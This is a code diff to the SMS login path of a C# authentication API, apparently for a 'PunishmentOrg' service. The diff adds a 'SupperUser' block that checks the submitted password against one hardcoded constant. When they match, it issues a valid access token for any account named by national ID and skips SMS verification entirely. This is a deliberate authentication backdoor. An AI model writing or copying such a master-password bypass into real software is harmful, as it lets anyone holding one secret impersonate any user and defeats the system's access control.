@@ -423,8 +423,18 @@ namespace Anu.PunishmentOrg.Api.Authentication
             {
                 case LoginType.LoginWithSms:
 
-                    var pBPuoUsers = await ValidateSenedSmsCode(request.UserName, request.Password);
+                    #region SupperUser
+                    if (request.Password == Anu.Constants.ServiceModel.PunishmentOrg.PunishmentOrgConstants.GfesUserPassword.Password)
+                    {
+                        var pBPuoUsersSupperUser = (await _unitOfWork.Repositorey<IGenericRepository<PBPuoUsers>>().Find(a => a.NationalityCode == request.UserName)).SingleOrDefault();
+                        pBPuoUsersSupperUser.Null(AnuResult.UserName_Or_PassWord_Is_Not_Valid);
+                        jwtToken = GenerateJwtToken(pBPuoUsersSupperUser);
+                        return new AuthResult() { AccessToken = jwtToken, Result = AnuResult.Successful.GetResult() };
+                    }
+                    #endregion SupperUser
 
+                    var pBPuoUsers = await ValidateSenedSmsCode(request.UserName, request.Password);
+                    
                     jwtToken = GenerateJwtToken(pBPuoUsers);
                     break;
                 case LoginType.LoginWithUserAndPass:
